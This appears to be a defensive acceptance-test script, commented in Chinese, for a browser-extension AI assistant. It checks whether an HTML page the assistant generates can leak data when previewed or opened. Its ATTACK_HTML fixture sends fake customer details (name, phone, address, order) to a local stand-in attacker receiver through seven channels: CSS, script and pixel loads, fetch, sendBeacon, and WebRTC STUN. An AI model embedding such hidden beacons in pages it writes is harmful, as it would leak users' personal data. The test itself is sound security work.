/**
 * 复现 #647：助手生成的网页在「交互预览」和「打开」里能不能把文件里的资料发到外部。
 *
 * 只装扩展的隔离无头 Chrome、真侧栏；模型换成本机脚本模型，按脚本写一个「订单汇总」网页，
 * 网页里除了正常的表格，还悄悄用 7 种方式（含不受 CSP 管的 WebRTC）把订单资料发往本机的接收器（代表攻击者服务器）。
 * 像用户一样先点「交互预览」，再点「打开」，分别数接收器收到了什么。
 *
 *   npx tsx scripts/acceptance/real-path/artifact-network.mts --headless
 *
 * 判据：接收器一条都没收到才算安全（PASS）；收到任何一条即 FAIL，并列出是哪种方式发出去的。
 * 脚本模型只证明预览框这一层，不证明真模型会不会被网页里的指令诱导写出这种网页。
 *
 * 产物：out/acceptance/real-path/<时间>-artifact-network/ 下 summary.json 和截图。
 */
import { createSocket } from "node:dgram";
import { createServer } from "node:http";
import { mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { REPO, launchRealPath, requireHeadless, siteAddress, sleep, until, type JsonRecord } from "./harness.mts";
import { configureViaSettings } from "./inproc-config.mts";
import { startScriptedModel, type Rule } from "./scripted-model.mts";

requireHeadless();

const hits: Array<{ phase: string; channel: string; data: string; at: number }> = [];

let phase = "setup";

/** 用户每次点击的时刻，配合录屏对时间。 */
const clicks: Record<string, number> = {};

const receiver = createServer((req, res) => {
  const url = new URL(req.url ?? "/", "http://x");
  const channel = url.pathname.slice(1);

  if (channel !== "favicon.ico") hits.push({ phase, channel, data: decodeURIComponent(url.searchParams.get("d") ?? ""), at: Date.now() / 1000 });
  res.setHeader("access-control-allow-origin", "*");

  if (channel === "js") return res.writeHead(200, { "content-type": "text/javascript" }).end("window.remoteScriptRan = true;");

  if (channel === "css") return res.writeHead(200, { "content-type": "text/css" }).end("body{}");

  if (channel === "pixel") return res.writeHead(200, { "content-type": "image/gif" }).end(Buffer.from("R0lGODlhAQABAAAAACw=", "base64"));
  res.writeHead(200, { "content-type": "text/plain" }).end("ok");
});

await new Promise<void>((done) => receiver.listen(0, "127.0.0.1", done));

const R = `http://127.0.0.1:${siteAddress(receiver).port}`;

// WebRTC 不归 CSP 管：STUN 包直接走 UDP，收到任何一个就算外发通道还开着。
const stun = createSocket("udp4");

stun.on("message", (msg) => hits.push({ phase, channel: "webrtc", data: `UDP ${msg.length} 字节`, at: Date.now() / 1000 }));

await new Promise<void>((done) => stun.bind(0, "127.0.0.1", done));

const STUN = `stun:127.0.0.1:${stun.address().port}`;

const PRIVATE = "张三 138-0000-1234 上海市徐汇区某路 88 号 订单 #A1029 ¥2,399";

const ATTACK_HTML = `<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>订单汇总</title>
<link rel="stylesheet" href="${R}/css?d=${encodeURIComponent(PRIVATE)}">
<script src="${R}/js?d=${encodeURIComponent(PRIVATE)}"></script>
<script src="https://cdn.jsdelivr.net/npm/dayjs@1.11.13/dayjs.min.js"></script>
<style>body{font:15px/1.6 -apple-system,sans-serif;margin:20px}table{border-collapse:collapse}td,th{border:1px solid #ccc;padding:4px 10px}</style>
</head><body>
<h2>最近订单</h2>
<table><tr><th>收件人</th><th>电话</th><th>地址</th><th>订单</th><th>金额</th></tr>
<tr><td>张三</td><td>138-0000-1234</td><td>上海市徐汇区某路 88 号</td><td>#A1029</td><td>¥2,399</td></tr></table>
<img src="${R}/pixel?d=${encodeURIComponent(PRIVATE)}" width="1" height="1" alt="">
<script>
const d = encodeURIComponent(document.querySelector("table").innerText);
fetch("${R}/fetch?d=" + d).catch(() => {});
new Image().src = "${R}/image?d=" + d;
navigator.sendBeacon && navigator.sendBeacon("${R}/beacon?d=" + d);
window.cdnLoaded = typeof dayjs === "function";
function rtc(PC, url) { try { const pc = new PC({ iceServers: [{ urls: url }] }); pc.createDataChannel(d.slice(0, 60)); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch {} }
rtc(window.RTCPeerConnection, "${STUN}");
</script></body></html>`;

const ASK = "把这页的订单整理成一个网页给我";

const RULES: Rule[] = [
  { match: ASK, steps: [{ tool: { name: "artifacts", args: { command: "create", filename: "订单汇总.html", content: ATTACK_HTML, deliver: true } } }, { text: "订单汇总网页做好了，可以点卡片预览。" }] },
];

const startedAt = new Date();

const out = join(REPO, "out/acceptance/real-path", `${startedAt.toISOString().replace(/[:.]/g, "-")}-artifact-network`);

await mkdir(out, { recursive: true });

const site = createServer((_req, res) => res.writeHead(200, { "content-type": "text/html; charset=utf-8" }).end("<!doctype html><title>我的订单</title><h1>我的订单</h1><p>张三 138-0000-1234</p>"));

await new Promise<void>((done) => site.listen(0, "127.0.0.1", done));

const model = await startScriptedModel(RULES);

const rp = await launchRealPath();

const evidence: JsonRecord = {};

let fatal: string | null = null;

let panel = "";

const cardSel = `.artifact-card[data-filename="订单汇总.html"]`;

try {
  const blank = await until(async () => (await rp.targets()).find((t) => t.type === "page" && t.url === "about:blank"), 10_000, "初始标签页");
  const work = await rp.attach(blank.targetId);
  await rp.cdp.send("Page.enable", {}, work);
  await rp.cdp.send("Page.navigate", { url: `http://127.0.0.1:${siteAddress(site).port}/` }, work);
  await sleep(800);
  panel = await rp.attach(await rp.openSidePanel());
  await rp.cdp.send("Emulation.setFocusEmulationEnabled", { enabled: true }, panel);
  const configured = await configureViaSettings(rp, panel, { providerId: "custom", modelId: "demo-model", credential: { type: "api_key", key: "local-demo-no-secret" } }, { baseUrl: model.baseUrl });
  await rp.cdp.send("Target.closeTarget", { targetId: configured.settingsTargetId });
  await until(async () => (await rp.evaluate(panel, `document.querySelector("#send-btn")?.disabled === false`)) || undefined, 90_000, "侧栏就绪", 500);

  await rp.click(panel, "#input");
  await rp.typeText(panel, ASK);
  await rp.pressEnter(panel);
  await until(async () => (await rp.evaluate(panel, `!!document.querySelector(${JSON.stringify(`${cardSel} .artifact-inline-toggle`)})`)) || undefined, 60_000, "出现网页卡片");
  await sleep(1500);
  hits.length = 0;

  phase = "交互预览";
  clicks[phase] = Date.now() / 1000;
  await rp.evaluate(panel, `document.querySelector(${JSON.stringify(`${cardSel} .artifact-inline-toggle`)}).scrollIntoView({ block: "center" }); true`);
  await rp.click(panel, `${cardSel} .artifact-inline-toggle`);
  await sleep(4000);
  await rp.evaluate(panel, `document.querySelector(".artifact-inline-frame")?.scrollIntoView({ block: "center" }); true`);
  await sleep(300);
  await rp.screenshot(panel, join(out, "1-inline-preview.png"));
  await rp.click(panel, `${cardSel} .artifact-inline-toggle`);
  await sleep(500);

  phase = "打开";
  clicks[phase] = Date.now() / 1000;
  const viewerPrefix = `chrome-extension://${rp.extensionId}/artifact-viewer.html`;
  await rp.click(panel, `${cardSel} .artifact-open`);
  const viewer = await until(async () => (await rp.targets()).find((t) => t.type === "page" && t.url.startsWith(viewerPrefix)), 10_000, "查看页");
  const vs = await rp.attach(viewer.targetId);
  await rp.cdp.send("Page.enable", {}, vs);
  await sleep(4000);
  await rp.cdp.send("Target.activateTarget", { targetId: viewer.targetId });
  await rp.screenshot(vs, join(out, "2-open-viewer.png"));
} catch (error) {
  fatal = error instanceof Error ? error.stack ?? error.message : String(error);
  console.error(fatal);

  if (panel) await rp.screenshot(panel, join(out, "error-panel.png")).catch(() => undefined);
} finally {
  await rp.close().catch(() => undefined);
  await rp.remove().catch(() => undefined);
  await model.close().catch(() => undefined);
  site.closeAllConnections();
  site.close();
  receiver.closeAllConnections();
  receiver.close();
  stun.close();
}

evidence.hits = hits;

const pass = !fatal && hits.length === 0;

await writeFile(join(out, "summary.json"), JSON.stringify({ case: "artifact-network", status: pass ? "pass" : "fail", hits, clicks, fatal }, null, 2));

for (const h of hits) console.log(`[${h.phase}] ${h.channel.padEnd(7)} ${h.data.replace(/\s+/g, " ").slice(0, 80)}`);
console.log(`${pass ? "PASS" : "FAIL"} artifact-network 收到 ${hits.length} 条 ${out}`);

process.exit(pass ? 0 : 1);
